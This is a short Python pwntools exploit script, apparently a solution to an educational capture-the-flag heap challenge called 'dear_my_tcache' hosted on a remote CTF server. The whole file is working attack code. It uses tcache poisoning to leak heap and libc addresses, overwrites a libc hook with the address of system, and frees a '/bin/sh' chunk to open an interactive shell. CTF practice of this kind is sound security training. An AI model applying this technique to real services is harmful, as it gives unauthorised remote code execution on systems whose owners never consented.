from pwn import *

#r = process(["./dear_my_tcache"])
r = remote("edu-ctf.zoolab.org", 4869 )
def alloca(data):
	r.sendlineafter(":","1")
	r.sendafter(":",data)

def remove(idx):
	r.sendlineafter(":","2")
	r.sendlineafter(":",str(idx))

def clean(idx):
	r.sendlineafter(":","3")
	r.sendlineafter(":",str(idx))

def show(idx):
	r.sendlineafter(":","4")
	r.sendlineafter(":",str(idx))

alloca("\x00"*0x20+p64(0)+p64(0x91))
alloca("\x00"*0x20+p64(0)+p64(0x41)+p64(0)*2+p64(0)+p64(0x21))
clean(1)
for i in range(6):
	remove(0)
show(0)
heap = u64(r.recvn(8))
print hex(heap)
clean(0)

alloca(p64(heap+0x20))
alloca("1")
clean(1)
alloca("a")
for i in range(7):
	remove(1)
clean(1)
show(0)
libc = u64(r.recvn(0x38)[-8:])-0x3ebca0
print hex(libc)
clean(0)
alloca(p64(libc+0x3ed8e8-0x10-0x8))
alloca("1")
clean(1)
alloca("/bin/sh\x00"+p64(libc+0x4f440))
remove(1)

r.interactive()
